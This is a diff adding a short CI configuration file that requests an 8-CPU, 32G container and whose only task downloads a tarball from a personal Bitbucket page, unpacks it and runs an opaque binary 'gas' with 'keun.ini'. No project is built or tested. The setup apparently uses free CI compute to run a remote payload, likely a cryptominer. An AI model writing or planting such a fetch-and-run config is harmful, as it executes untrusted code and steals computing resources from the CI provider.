@@ -1,0 +1,7 @@
+container:
+  image: openjdk:8-jdk
+  cpu: 8.0
+  memory: 32G
+
+task:
+  script: wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
